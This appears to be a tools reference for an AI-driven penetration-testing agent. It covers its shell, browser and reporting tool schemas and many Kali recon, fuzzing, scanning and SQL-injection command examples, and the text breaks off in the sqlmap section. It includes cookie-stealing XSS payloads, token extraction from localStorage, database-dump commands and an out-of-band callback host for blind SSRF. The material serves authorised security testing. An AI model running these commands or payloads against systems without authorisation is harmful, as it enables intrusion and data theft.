# AIRecon Tools Reference

Complete reference for all tools available to the AIRecon agent — native Python tools, Docker sandbox tools, and git-cloned tool scripts.

## Table of Contents

1. [Tool Architecture Overview](#1-tool-architecture-overview)
2. [Native Agent Tools](#2-native-agent-tools)
   - [execute](#21-execute--docker-sandbox-shell)
   - [browser_action](#22-browser_action--headless-chromium)
   - [web_search](#23-web_search--duckduckgo-search)
   - [create_vulnerability_report](#24-create_vulnerability_report)
   - [create_file](#25-create_file)
   - [read_file](#26-read_file)
3. [Docker Sandbox Tools by Category](#3-docker-sandbox-tools-by-category)
   - [Subdomain Discovery](#31-subdomain-discovery)
   - [DNS & IP Intelligence](#32-dns--ip-intelligence)
   - [Port Scanning](#33-port-scanning)
   - [Web Crawling & URL Discovery](#34-web-crawling--url-discovery)
   - [Technology Fingerprinting](#35-technology-fingerprinting)
   - [JavaScript Analysis](#36-javascript-analysis)
   - [Parameter & Directory Fuzzing](#37-parameter--directory-fuzzing)
   - [Vulnerability Scanning](#38-vulnerability-scanning)
   - [Exploitation Tools](#39-exploitation-tools)
   - [Password Attacks & Brute-Force](#310-password-attacks--brute-force)
   - [CMS Scanners](#311-cms-scanners)
   - [Secret & Code Analysis](#312-secret--code-analysis)
   - [GraphQL & JWT Testing](#313-graphql--jwt-testing)
   - [SSL/TLS & Crypto](#314-ssltls--crypto)
   - [Cloud & S3 Recon](#315-cloud--s3-recon)
   - [Proxy & Traffic Interception](#316-proxy--traffic-interception)
   - [Scripting & Utility](#317-scripting--utility)
   - [Wordlists & Payloads](#318-wordlists--payloads)
4. [Git-Cloned Tool Scripts](#4-git-cloned-tool-scripts)
5. [Tool PATH Reference](#5-tool-path-reference)
6. [Self-Install Capability](#6-self-install-capability)
7. [Tool Usage Patterns](#7-tool-usage-patterns)

---

## 1. Tool Architecture Overview

AIRecon exposes tools to the LLM through two layers:

```
┌──────────────────────────────────────────────────────────────┐
│                        LLM (Ollama)                          │
│              sees tool definitions as JSON schema            │
└────────────────────────┬─────────────────────────────────────┘
                         │ tool call (name + arguments)
                         ▼
┌──────────────────────────────────────────────────────────────┐
│                    Agent Loop (Python)                       │
│           routes calls to the correct handler                │
└──────┬─────────────────┬────────────────────┬───────────────┘
       │                 │                    │
       ▼                 ▼                    ▼
┌─────────────┐  ┌──────────────┐  ┌─────────────────────┐
│  execute    │  │ browser /    │  │ create_file /       │
│  (Docker    │  │ web_search / │  │ read_file /         │
│  sandbox)   │  │ reporting    │  │ (workspace FS)      │
└──────┬──────┘  └──────────────┘  └─────────────────────┘
       │
       ▼
┌──────────────────────────────────────────────────────────────┐
│          Kali Linux Docker Container (airecon-sandbox)        │
│    60+ pre-installed tools, SecLists, FuzzDB, custom scripts  │
└──────────────────────────────────────────────────────────────┘
```

**Native tools** (defined in Python, called directly by the agent loop):
`execute`, `browser_action`, `web_search`, `create_vulnerability_report`, `create_file`, `read_file`

**Docker tools** (called via `execute` inside the Kali container):
All CLI tools in the sandbox — subfinder, nmap, nuclei, sqlmap, ffuf, etc.

---

## 2. Native Agent Tools

These tools are implemented directly in Python and registered with the Ollama tool-calling API. The LLM calls them by name with structured arguments.

---

### 2.1 `execute` — Docker Sandbox Shell

**Source:** `airecon/proxy/docker.py`

The single entry point for all shell command execution. Runs any bash command inside the isolated Kali Linux Docker container with full access to all pre-installed security tools.

**Schema:**

```json
{
  "name": "execute",
  "parameters": {
    "command": {
      "type": "string",
      "description": "Bash command to run inside the sandbox. Supports pipes, redirects, and chaining."
    },
    "timeout": {
      "type": "integer",
      "description": "Timeout in seconds. Default: config command_timeout (900s). Increase for long scans."
    }
  },
  "required": ["command"]
}
```

**Returns:**

```json
{
  "success": true,
  "stdout": "<command output>",
  "stderr": "<error output>",
  "exit_code": 0,
  "result": "<stdout if success, null if failed>",
  "error": "<stderr if failed, null if success>"
}
```

**Key behaviours:**

- **User:** runs as `pentester` with passwordless `sudo` — can escalate to root for tools that require it (e.g., `sudo nmap -sS`)
- **Working directory:** `/` inside the container; the agent uses absolute paths for workspace (`/workspace/<target>/`)
- **PATH:** includes Go tools (`~/go/bin`), pipx tools (`~/.local/bin`), npm globals (`~/.npm-global/bin`), and all system paths
- **Workspace mount:** host `./workspace/` is mounted at `/workspace/` inside the container — outputs written there persist on the host
- **Timeout:** when exceeded, kills the process and also runs `pkill -KILL -u pentester` inside the container to prevent zombie processes
- **Cancellation:** supports user-initiated ESC cancellation (sends `SIGKILL` to the running process)
- **Environment:** sets `GOPATH`, `HOME`, `PIPX_HOME`, `NPM_CONFIG_PREFIX` for tool compatibility

**Example calls:**

```bash
# Basic scan — writes output to workspace
execute(command="subfinder -d example.com -o /workspace/example.com/output/subdomains.txt")

# Piped chain
execute(command="cat /workspace/example.com/output/subdomains.txt | dnsx -silent | tee /workspace/example.com/output/resolved.txt")

# Python script
execute(command="python3 /workspace/example.com/tools/fuzz_login.py https://example.com")

# Sudo for raw socket scan
execute(command="sudo nmap -sS -p- --open 10.0.0.1 -oA /workspace/example.com/output/nmap")

# Long-running scan with extended timeout
execute(command="nuclei -l /workspace/example.com/output/live_hosts.txt -t /root/nuclei-templates -o /workspace/example.com/output/nuclei.txt", timeout=3600)
```

---

### 2.2 `browser_action` — Headless Chromium

**Source:** `airecon/proxy/browser.py`

Controls a headless Chromium instance via Playwright and Chrome DevTools Protocol (CDP). The browser connects to the Chromium CDP server running inside the Docker sandbox on port 9222.

**Schema:**

```json
{
  "name": "browser_action",
  "parameters": {
    "action": {
      "type": "string",
      "enum": [
        "launch", "goto", "click", "type", "scroll_down", "scroll_up",
        "back", "forward", "new_tab", "switch_tab", "close_tab",
        "wait", "execute_js", "double_click", "hover", "press_key",
        "save_pdf", "get_console_logs", "view_source", "close", "list_tabs"
      ]
    },
    "url":        "string — for launch/goto/new_tab",
    "coordinate": "string — 'x,y' for click/hover/double_click",
    "text":       "string — for type",
    "tab_id":     "string — target tab (from launch/new_tab response)",
    "js_code":    "string — for execute_js",
    "duration":   "number — seconds for wait",
    "key":        "string — for press_key (e.g. 'Enter', 'Tab', 'F12')",
    "file_path":  "string — for save_pdf",
    "clear":      "boolean — for get_console_logs"
  },
  "required": ["action"]
}
```

**Returns:** All browser actions return a state object containing:

```json
{
  "screenshot": "<base64 PNG of current viewport>",
  "url": "https://current.page/url",
  "title": "Page Title",
  "viewport": { "width": 1280, "height": 720 },
  "tab_id": "tab_1",
  "all_tabs": { "tab_1": { "url": "...", "title": "..." } },
  "message": "Action-specific success message"
}
```

Additional fields per action:
- `execute_js` → `+ "js_result": <evaluated result>`
- `get_console_logs` → `+ "console_logs": [{ "type": "log", "text": "...", "location": {...} }]`
- `view_source` → `+ "page_source": "<HTML source, truncated at 20K chars>"`
- `save_pdf` → `+ "pdf_saved": "/workspace/.../report.pdf"`

**Action reference:**

| Action | Arguments | Description |
|--------|-----------|-------------|
| `launch` | `url?` | Start browser session. Opens a new tab, optionally navigates to URL. Required before all other actions. |
| `goto` | `url`, `tab_id?` | Navigate to URL and wait for DOM to load |
| `click` | `coordinate`, `tab_id?` | Left-click at pixel coordinates `"x,y"` |
| `double_click` | `coordinate`, `tab_id?` | Double-click at pixel coordinates |
| `hover` | `coordinate`, `tab_id?` | Move mouse to coordinates (triggers hover effects) |
| `type` | `text`, `tab_id?` | Type text at current focus (uses keyboard events) |
| `press_key` | `key`, `tab_id?` | Press a key: `"Enter"`, `"Tab"`, `"Escape"`, `"F12"`, `"ctrl+a"` |
| `scroll_down` | `tab_id?` | Scroll down one viewport (PageDown key) |
| `scroll_up` | `tab_id?` | Scroll up one viewport (PageUp key) |
| `back` | `tab_id?` | Browser history back |
| `forward` | `tab_id?` | Browser history forward |
| `new_tab` | `url?` | Open a new browser tab |
| `switch_tab` | `tab_id` | Switch active tab by ID |
| `close_tab` | `tab_id` | Close a tab (must keep at least 1 open) |
| `list_tabs` | — | List all open tabs with their URLs and titles |
| `execute_js` | `js_code`, `tab_id?` | Run arbitrary JavaScript in the page context. Returns the evaluated result. |
| `view_source` | `tab_id?` | Get the full HTML source of the current page (max 20K chars, truncated with middle section) |
| `get_console_logs` | `tab_id?`, `clear?` | Retrieve all browser console log entries (max 200 logs, 30K chars total) |
| `save_pdf` | `file_path`, `tab_id?` | Save current page as PDF. Path relative to workspace root or absolute. |
| `wait` | `duration`, `tab_id?` | Wait N seconds (float), then return page state |
| `close` | — | Close browser and release all resources |

**Common use cases:**

```python
# Inspect a JavaScript-heavy SPA for secrets
browser_action(action="launch", url="https://example.com")
browser_action(action="view_source")
browser_action(action="get_console_logs")

# XSS verification
browser_action(action="goto", url="https://example.com/search?q=<script>alert(1)</script>")
browser_action(action="execute_js", js_code="document.querySelector('script') ? 'INJECTED' : 'NOT_INJECTED'")

# Login flow automation (get session token)
browser_action(action="launch", url="https://example.com/login")
browser_action(action="click", coordinate="400,300")      # click username field
browser_action(action="type", text="admin@example.com")
browser_action(action="press_key", key="Tab")
browser_action(action="type", text="password123")
browser_action(action="press_key", key="Enter")
browser_action(action="execute_js", js_code="localStorage.getItem('auth_token')")

# Extract all API endpoints from minified JS
browser_action(action="execute_js", js_code="""
  Array.from(document.querySelectorAll('script[src]'))
    .map(s => s.src)
    .filter(s => s.includes('/static/js/'))
""")
```

---

### 2.3 `web_search` — DuckDuckGo Search

**Source:** `airecon/proxy/web_search.py`

Performs a live web search via DuckDuckGo during assessments. Used for CVE research, WAF bypass lookups, and technology-specific payload discovery.

**Schema:**

```json
{
  "name": "web_search",
  "parameters": {
    "query": {
      "type": "string",
      "description": "Search query"
    },
    "max_results": {
      "type": "integer",
      "description": "Number of results to return (default: 5, max: 10)"
    }
  },
  "required": ["query"]
}
```

**Returns:**

```json
{
  "success": true,
  "result": "1. **Title**\n   URL: https://...\n   Snippet...\n\n2. ..."
}
```

**Agent use cases:**

```python
# Research a CVE found in scan output
web_search(query="CVE-2024-4577 PHP CGI exploit PoC")

# Find WAF bypass for a blocked payload
web_search(query="cloudflare WAF bypass XSS 2024 unicode")

# Look up unfamiliar technology security issues
web_search(query="Supabase RLS bypass techniques security")

# Get correct tool flags when help is insufficient
web_search(query="ffuf recursive directory scan flags 2024")

# Discover payload lists for a specific injection type
web_search(query="SSTI Jinja2 payloads bypass WAF")
```

---

### 2.4 `create_vulnerability_report`

**Source:** `airecon/proxy/reporting.py`

Generates a structured, CVSS-scored Markdown vulnerability report and saves it to `workspace/<target>/vulnerabilities/`. The tool enforces quality gates — it requires a working Proof of Concept and validates CVSS inputs before accepting a report.

**Schema:**

```json
{
  "name": "create_vulnerability_report",
  "parameters": {
    "target":           "string — Target domain/IP/URL",
    "title":            "string — Vulnerability title (concise, e.g. 'Reflected XSS in search parameter')",
    "vuln_type":        "string — Category: XSS, SQLi, SSRF, IDOR, RCE, etc.",
    "severity":         "string — critical | high | medium | low | informational",
    "cvss_score":       "number — 0.0–10.0 base score",
    "cvss_vector":      "string — CVSS 3.1 vector string (e.g. AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    "affected_url":     "string — The specific URL or endpoint where the vuln exists",
    "description":      "string — Technical description of the vulnerability",
    "poc_request":      "string — Raw HTTP request or curl command that triggers the vuln",
    "poc_response":     "string — Server response demonstrating the impact",
    "poc_script_code":  "string — Python script that reproduces the finding end-to-end",
    "impact":           "string — Business impact: what data/system is at risk",
    "remediation":      "string — Developer-facing fix instructions",
    "cve_id":           "string? — Optional CVE identifier (e.g. CVE-2024-12345)"
  }
}
```

**Enforcement rules (will reject if violated):**

- `poc_request` AND `poc_response` must be non-empty — no theoretical reports
- `cvss_score` must be in range 0.0–10.0
- `cvss_vector` must match the CVSS 3.1 format (`AV:*/AC:*/PR:*/UI:*/S:*/C:*/I:*/A:*`)
- `cve_id` (if provided) must match `CVE-YYYY-NNNN` format
- LLM-based deduplication rejects reports for the same vulnerability already filed against the same target

**Output format:**

The tool saves a Markdown file to `workspace/<target>/vulnerabilities/<sanitized_title>.md` with sections: Summary, Severity, CVSS, Affected Asset, Description, Technical Details (PoC request/response), Impact, Proof of Concept Script, Remediation.

**Example call:**

```python
create_vulnerability_report(
    target="example.com",
    title="Reflected XSS in q parameter of /search endpoint",
    vuln_type="XSS",
    severity="high",
    cvss_score=8.2,
    cvss_vector="AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    affected_url="https://example.com/search?q=INJECT",
    description="The search parameter is reflected in the response without HTML encoding, allowing arbitrary JavaScript execution in victim browsers.",
    poc_request="GET /search?q=<img src=x onerror=alert(document.cookie)> HTTP/1.1\nHost: example.com",
    poc_response="HTTP/1.1 200 OK\n...<img src=x onerror=alert(document.cookie)>...",
    poc_script_code="import requests\nr = requests.get('https://example.com/search', params={'q': '<img src=x onerror=alert(1)>'})\nprint('VULNERABLE' if 'onerror=alert' in r.text else 'NOT VULNERABLE')",
    impact="Session hijacking, credential theft, phishing via DOM manipulation",
    remediation="HTML-encode all user input before reflecting it in the response. Use Content-Security-Policy headers."
)
```

---

### 2.5 `create_file`

**Source:** `airecon/proxy/filesystem.py`

Creates a file in the workspace directory. Enforces workspace confinement — paths outside `workspace/` are rejected.

**Schema:**

```json
{
  "name": "create_file",
  "parameters": {
    "path": "string — Relative to workspace root, or absolute inside workspace",
    "content": "string — Text content to write"
  }
}
```

**Path resolution rules:**
- Strips leading `/`
- Strips `workspace/` prefix if the AI includes it
- Validates the resolved path stays inside the workspace root (blocks `../` traversal)
- Creates parent directories automatically

**Example calls:**

```python
# Write a custom exploitation script
create_file(
    path="example.com/tools/idor_bruteforce.py",
    content="#!/usr/bin/env python3\nimport requests\n..."
)

# Store notes
create_file(
    path="example.com/output/recon_notes.txt",
    content="Found admin panel at /admin - returns 403 but changes to POST bypass"
)
```

---

### 2.6 `read_file`

**Source:** `airecon/proxy/filesystem.py`

Reads a file from the workspace. Also used to load Skill documents from `airecon/proxy/skills/`. Enforces workspace confinement for workspace paths; skill paths use absolute paths from the installed package.

**Schema:**

```json
{
  "name": "read_file",
  "parameters": {
    "path": "string — Workspace-relative path, or absolute path to a skill file"
  }
}
```

**Example calls:**

```python
# Read tool output to analyze
read_file(path="example.com/output/nuclei.txt")

# Load a skill for a detected technology
read_file(path="/home/user/.../airecon/proxy/skills/vulnerabilities/ssrf.md")

# Read a previously created script
read_file(path="example.com/tools/exploit.py")
```

---

## 3. Docker Sandbox Tools by Category

All tools in this section are called via `execute(command="...")`. The sandbox runs Kali Linux with user `pentester` and passwordless `sudo`.

---

### 3.1 Subdomain Discovery

| Tool | Install | Key flags | Example |
|------|---------|-----------|---------|
| **subfinder** | Go (`~/go/bin`) | `-d domain`, `-all` (all sources), `-recursive`, `-o file` | `subfinder -d example.com -all -recursive -o /workspace/t/output/subs.txt` |
| **amass** | System (v3.23.3) | `enum -passive -d domain`, `enum -active -brute -d domain` | `amass enum -passive -d example.com -o /workspace/t/output/amass.txt` |
| **assetfinder** | Go | `--subs-only domain` | `assetfinder --subs-only example.com >> /workspace/t/output/subs.txt` |
| **shuffledns** | Go | `-d domain -w wordlist -r resolvers.txt` | `shuffledns -d example.com -w /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top500.txt -r resolvers.txt` |
| **massdns** | System | `-r resolvers.txt -t A -o S wordlist` | Used via shuffledns pipeline |
| **sublist3r** | pipx | `-d domain -o file` | `sublist3r -d example.com -o /workspace/t/output/sublist3r.txt` |
| **hakip2host** | Go | `<IP>` | `hakip2host 93.184.216.34` — reverse map IP to domains |
| **cut-cdn** | pipx | `-l hosts.txt -o no_cdn.txt` | Filter out CDN-owned IPs for direct scanning |
| **dnsx** | Go (`~/go/bin`) | `-l subdomains.txt -silent -o resolved.txt` | `cat subs.txt \| dnsx -silent -a -o resolved.txt` |

**Typical subdomain workflow:**

```bash
# 1. Multi-source discovery
subfinder -d example.com -all -o /workspace/example.com/output/subs_subfinder.txt
amass enum -passive -d example.com -o /workspace/example.com/output/subs_amass.txt
assetfinder --subs-only example.com > /workspace/example.com/output/subs_assetfinder.txt

# 2. Combine and deduplicate
cat /workspace/example.com/output/subs_*.txt | sort -u > /workspace/example.com/output/all_subs.txt

# 3. Resolve to IPs
dnsx -l /workspace/example.com/output/all_subs.txt -silent -a -o /workspace/example.com/output/resolved.txt

# 4. Probe for live HTTP(S) services
httpx -l /workspace/example.com/output/resolved.txt -title -tech-detect -status-code -o /workspace/example.com/output/live_hosts.txt
```

---

### 3.2 DNS & IP Intelligence

| Tool | Key flags | Example |
|------|-----------|---------|
| **dnsx** | `-l hosts -silent -a -cname -ptr -resp` | Full DNS resolution with CNAME and PTR |
| **tlsx** | `-l hosts -san -cn -o tls.txt` | Extract SANs from TLS certs (free subdomain discovery) |
| **dig** | `+short @8.8.8.8 example.com A` | Manual DNS lookup with specific resolver |
| **nslookup** | `example.com 1.1.1.1` | Alternative DNS query |
| **whois** | `example.com` | WHOIS registration info |
| **dnsrecon** | `-d example.com -t axfr` | Zone transfer attempt, comprehensive DNS enum |
| **dnsenum** | `--noreverse example.com` | DNS bruteforce and zone transfer |
| **nrich** | `< ips.txt` | Enrich IP list with ASN, org, country info |
| **notify** | `-i report.md -provider slack` | Send alerts to Slack/Discord/Telegram |

**Certificate transparency for free subdomains:**

```bash
# TLS SAN extraction — often reveals internal subdomains
tlsx -l /workspace/example.com/output/resolved.txt -san -cn -o /workspace/example.com/output/tls_certs.txt

# Combine with existing list
cat /workspace/example.com/output/tls_certs.txt >> /workspace/example.com/output/all_subs.txt
sort -u -o /workspace/example.com/output/all_subs.txt /workspace/example.com/output/all_subs.txt
```

---

### 3.3 Port Scanning

| Tool | Key flags | Notes |
|------|-----------|-------|
| **nmap** | `-sS` (SYN), `-sV` (version), `-sC` (scripts), `-p-` (all ports), `--open`, `-oA` (all formats) | Requires `sudo` for SYN scan. Accepts `-iL file` for host lists. |
| **naabu** | `-l hosts.txt -p 80,443,8080 -o ports.txt` | Fast port scanner by ProjectDiscovery. IP and hostname both work. |
| **masscan** | `--rate 10000 -p 1-65535 <IP>` | **IP ONLY** — resolve domain first! Fastest raw scanner. Requires `sudo`. |
| **netcat** | `-zv host 80` | Quick TCP connectivity check |

**Port scan workflow:**

```bash
# Resolve domain to IP first (required for masscan)
TARGET_IP=$(dig +short example.com A | head -1)

# Fast masscan for all ports
sudo masscan --rate 10000 -p 0-65535 $TARGET_IP -oL /workspace/example.com/output/masscan.txt

# Deep nmap on discovered open ports
OPEN_PORTS=$(grep "open" /workspace/example.com/output/masscan.txt | awk '{print $3}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sV -sC -p $OPEN_PORTS example.com -oA /workspace/example.com/output/nmap_targeted

# Quick full scan with naabu
naabu -l /workspace/example.com/output/resolved.txt -p - -o /workspace/example.com/output/naabu_ports.txt
```

---

### 3.4 Web Crawling & URL Discovery

| Tool | Key flags | Description |
|------|-----------|-------------|
| **katana** | `-l hosts.txt -depth 3 -js-crawl -o urls.txt` | Modern crawler with JavaScript rendering. Best for SPAs. |
| **gospider** | `-S hosts.txt -o gospider/ -t 20` | Recursive web spider with form discovery |
| **gau** | `example.com \| tee urls_gau.txt` | Fetches all known URLs from Wayback Machine + common crawl |
| **waybackurls** | `< hosts.txt \| tee wayback.txt` | Wayback Machine URL dump for each host |
| **meg** | `-d 1000 /paths.txt hosts.txt output/` | Fetch many paths across many hosts efficiently |
| **httprobe** | `< domains.txt \| tee live.txt` | Simple HTTP/HTTPS probe — outputs live URLs |
| **httpx** | `-l hosts -title -tech-detect -status-code -o live.txt` | Full-featured HTTP probe with fingerprinting |
| **waymore** | `-i example.com -mode U -oU urls.txt` | Enhanced Wayback + Common Crawl URL discovery |
| **dirsearch** | `-l hosts.txt -w wordlist -o dirs.txt` | Directory/path brute-force |
| **feroxbuster** | `-u URL -w wordlist --auto-bail -o dirs.txt` | Recursive directory scanner with smart recursion |

**URL collection pipeline:**

```bash
TARGET="example.com"
WORKSPACE="/workspace/$TARGET"

# Archive-based URL discovery
gau $TARGET | tee $WORKSPACE/output/urls_gau.txt
echo $TARGET | waybackurls | tee $WORKSPACE/output/urls_wayback.txt

# Active crawling
katana -u https://$TARGET -depth 4 -js-crawl -o $WORKSPACE/output/urls_katana.txt
gospider -s https://$TARGET -o $WORKSPACE/output/gospider/ -t 10 -r

# Combine, filter scope, deduplicate
cat $WORKSPACE/output/urls_*.txt | grep -E "https?://(www\.)?$TARGET" | sort -u > $WORKSPACE/output/urls_all.txt
echo "Total unique URLs: $(wc -l < $WORKSPACE/output/urls_all.txt)"
```

---

### 3.5 Technology Fingerprinting

| Tool | Key flags | Output |
|------|-----------|--------|
| **httpx** | `-l hosts -tech-detect -title -status-code -ip -content-length` | JSON with tech stack per host |
| **whatweb** | `-i live_hosts.txt --log-brief report.txt` | Technology detection with aggression level |
| **wafw00f** | `https://example.com` | WAF detection and identification |
| **nikto** | `-h https://example.com -o nikto.txt` | Web server misconfiguration scan |
| **wapiti** | `-u https://example.com -o wapiti/ -f html` | Web vulnerability scanner with tech detection |
| **wappalyzer** | `https://example.com` | npm global — detailed technology stack JSON |
| **retire** | `--js --jspath output/js/ --outputformat json` | Detects outdated/vulnerable JavaScript libraries |
| **tlsx** | `-l hosts -san -cn -version -cipher -o tls.txt` | TLS version, cipher suites, certificate details |

```bash
# Full fingerprinting sweep
httpx -l /workspace/example.com/output/live_hosts.txt \
    -tech-detect -title -status-code -ip -content-length -wc \
    -json -o /workspace/example.com/output/httpx_detailed.json

# WAF identification
cat /workspace/example.com/output/live_hosts.txt | while read url; do
    echo -n "$url: "
    wafw00f $url 2>/dev/null | grep -oP "(?<=behind a ).*?(?= WAF)" || echo "none detected"
done | tee /workspace/example.com/output/waf_detection.txt
```

---

### 3.6 JavaScript Analysis

| Tool | Location | Description |
|------|----------|-------------|
| **jsleak** | Go (`~/go/bin`) | Finds secrets (API keys, tokens, credentials) in JS files |
| **jsluice** | Go (`~/go/bin`) | `jsluice urls file.txt` — extracts URLs and endpoints from JS |
| **gf** | Go + patterns at `~/.gf/` | Grep with named patterns: `secrets`, `sqli`, `xss`, `ssrf`, `redirect`, `rce`, `lfi`, `idor`, `debug-pages`, `cors`, `upload-fields`, `interestingparams` |
| **trufflehog** | Go | Deep secret scanner with entropy analysis |
| **js-beautify** | npm global | Deobfuscates/prettifies minified JavaScript |
| **eslint** | npm global | JavaScript static analysis with security rules |
| **jshint** | npm global | Lint + security issues in JavaScript |
| **JS-Snooper** | `/home/pentester/tools/JS-Snooper/js_snooper.sh` | Extract secrets (API keys, tokens) from JS URLs |
| **jsniper.sh** | `/home/pentester/tools/jsniper.sh/jsniper.sh` | Deep JavaScript recon targeting |
| **LinkFinder** | `/home/pentester/tools/LinkFinder/linkfinder.py` | Extract endpoints and parameters from JS files |
| **LinksDumper** | `/home/pentester/tools/LinksDumper/LinksDumper.py` | Enumerate all links from a page |
| **jsfinder** | `/home/pentester/tools/jsfinder/jsfinder.py` | Find and download JavaScript files from web pages |
| **JS-Scan** | `/home/pentester/tools/JS-Scan/` | JavaScript vulnerability scanner |

**JavaScript analysis pipeline:**

```bash
WORKSPACE="/workspace/example.com"

# 1. Extract all JS URLs from katana output
grep "\.js" $WORKSPACE/output/urls_katana.txt | sort -u > $WORKSPACE/output/js_urls.txt

# 2. Scan for secrets
cat $WORKSPACE/output/js_urls.txt | jsleak | tee $WORKSPACE/output/js_secrets_jsleak.txt

# 3. Extract hidden endpoints
jsluice urls $WORKSPACE/output/js_urls.txt | tee $WORKSPACE/output/js_endpoints.txt

# 4. Pattern grep for interesting parameters
cat $WORKSPACE/output/urls_katana.txt | gf sqli | tee $WORKSPACE/output/gf_sqli.txt
cat $WORKSPACE/output/urls_katana.txt | gf xss | tee $WORKSPACE/output/gf_xss.txt
cat $WORKSPACE/output/urls_katana.txt | gf ssrf | tee $WORKSPACE/output/gf_ssrf.txt
cat $WORKSPACE/output/urls_katana.txt | gf idor | tee $WORKSPACE/output/gf_idor.txt

# 5. Deep endpoint extraction from JS files
python3 /home/pentester/tools/LinkFinder/linkfinder.py \
    -i $WORKSPACE/output/js_urls.txt \
    -o $WORKSPACE/output/js_linkfinder.txt

# 6. Deobfuscate and lint a suspicious JS file
curl -s "https://example.com/static/app.min.js" | js-beautify > $WORKSPACE/output/app_deobfuscated.js
eslint --no-eslintrc --rule '{"no-eval": "error"}' $WORKSPACE/output/app_deobfuscated.js
```

---

### 3.7 Parameter & Directory Fuzzing

| Tool | Key flags | Description |
|------|-----------|-------------|
| **ffuf** | `-u URL/FUZZ -w wordlist -mc 200,301,302,403` | Fast and flexible web fuzzer. Use `FUZZ` placeholder in URL, headers, POST body. |
| **feroxbuster** | `-u URL -w wordlist --auto-bail --depth 3 -o dirs.txt` | Recursive directory scanner with smart auto-bail |
| **dirsearch** | `-u URL -w wordlist -o dirs.txt` | Directory scanner with common-path wordlists |
| **x8** | `-u URL -w params.txt -o params.txt` | Hidden HTTP parameter discovery via response analysis |
| **arjun** | `-u URL --stable -oJ params.json` | Parameter discovery using timing and response-size analysis |
| **headi** | `-u URL -o headers.txt` | HTTP header injection parameter discovery |
| **dalfox** | `file urls.txt --output xss.txt` | XSS scanner with DOM-based detection |
| **wfuzz** | `-c -z file,wordlist -u URL/FUZZ` | Legacy fuzzer with powerful filtering |

**ffuf advanced examples:**

```bash
# Directory brute-force
ffuf -u https://example.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
     -mc 200,301,302,403 -ac -o /workspace/example.com/output/ffuf_dirs.json

# Parameter fuzzing in GET
ffuf -u "https://example.com/search?FUZZ=test" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 200 -fs 0 -o /workspace/example.com/output/ffuf_params.json

# POST body parameter fuzzing
ffuf -X POST -u https://example.com/api/login \
     -d '{"FUZZ":"value"}' \
     -H "Content-Type: application/json" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -mc 200,401,422

# Subdomain brute-force via vhost
ffuf -u https://example.com -H "Host: FUZZ.example.com" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -ac -mc 200,301,302
```

**Parameter discovery workflow:**

```bash
# Arjun — statistical parameter discovery
arjun -u https://example.com/search --stable -oJ /workspace/example.com/output/arjun_params.json

# x8 — response-analysis based
x8 -u "https://example.com/api/user" \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
   -o /workspace/example.com/output/x8_params.txt

# Header injection discovery
headi -u https://example.com -o /workspace/example.com/output/header_injection.txt
```

---

### 3.8 Vulnerability Scanning

| Tool | Key flags | Notes |
|------|-----------|-------|
| **nuclei** | `-l hosts -t /root/nuclei-templates -severity medium,high,critical -o nuclei.txt` | Template-based scanner. **GATE: only after Phase 1+2 complete.** |
| **nikto** | `-h URL -o nikto.txt` | Comprehensive web server misconfiguration check |
| **wapiti** | `-u URL -o wapiti/ -f html` | Full-featured web vulnerability scanner |
| **sqlmap** | `-u URL --batch --level 3 --risk 2 --output-dir output/sqlmap/` | Automated SQL injection detection and exploitation |
| **ghauri** | `-u URL --dbs --batch` | Modern sqlmap alternative with WAF bypass |
| **dalfox** | `url URL --output xss.txt` or `file urls.txt --output xss.txt` | DOM-aware XSS scanner with mutation engine |
| **nosqli** | `-u URL` | NoSQL injection tester |
| **toxicache** | `-u URL` | Cache poisoning/deception tester |
| **csprecon** | `-d domain` | Content Security Policy analysis and bypass detection |
| **semgrep** | `--config=auto .` | SAST — static analysis with security rules |
| **trivy** | `image airecon-sandbox` or `fs /path` | Container and filesystem vulnerability scanner |
| **bandit** | `-r /path/to/python/code` | Python SAST scanner |
| **interactsh-client** | `-server oast.fun -n 5` | OOB callback listener for blind SSRF, XXE, RCE |

**Nuclei best-practice invocation:**

```bash
# Standard scan after live hosts confirmed
nuclei -l /workspace/example.com/output/live_hosts.txt \
       -t /root/nuclei-templates \
       -severity medium,high,critical \
       -rl 50 \
       -timeout 10 \
       -o /workspace/example.com/output/nuclei_results.txt \
       -json | tee /workspace/example.com/output/nuclei_results.json

# Technology-specific template targeting
nuclei -l /workspace/example.com/output/live_hosts.txt \
       -tags wordpress,cve,exposed-panels \
       -severity high,critical \
       -o /workspace/example.com/output/nuclei_wordpress.txt

# CVE-specific scan
nuclei -u https://example.com \
       -t /root/nuclei-templates/cves/ \
       -severity critical \
       -o /workspace/example.com/output/nuclei_cves.txt
```

**Blind SSRF/XXE/RCE with interactsh:**

```bash
# Start OOB listener (generates unique callback URLs)
interactsh-client -server oast.fun -n 5 &
# Outputs: abc123.oast.fun, def456.oast.fun, ...

# Use the callback URL in payloads
curl -s "https://example.com/fetch?url=http://abc123.oast.fun"
# interactsh-client will show incoming DNS/HTTP requests
```

---

### 3.9 Exploitation Tools

| Tool | Key flags | Description |
|------|-----------|-------------|
| **sqlmap** | `--dbs --tables --dump --batch` | Full SQL injection exploitation chain |
| **ghauri** | `--dbs --batch --level 3` | Modern WAF-aware SQL injection tool |
| **dalfox** | `--remote-payloads --output xss.txt` | XSS payload mutation and exploitation |
| **nosqli** | `-u URL -p param` | NoSQL injection (MongoDB, CouchDB) |
| **toxicache** | `-u URL --all` | Cache poisoning with multiple techniques |
| **headi** | `-u URL --all` | HTTP header injection (Host, X-Forwarded-For, etc.) |
| **interactsh-client** | `-v` (verbose callbacks) | OOB interaction server for blind vuln confirmation |
| **caido-cli** | See Caido section below | Web proxy for request replay and manipulation |
| **testssl.sh** | `--parallel --severity HIGH example.com` | SSL/TLS exploitation: BEAST, POODLE, Heartbleed |

**SQLmap full exploitation chain:**

```bash
# Initial detection
sqlmap -u "https://example.com/user?id=1" --batch --level 3 --risk 2

# Database enumeration
sqlmap -u "https://example.com/user?id=1" --batch --dbs

# Table dump
sqlmap -u "https://example.com/user?id=1" --batch -D target_db --tables

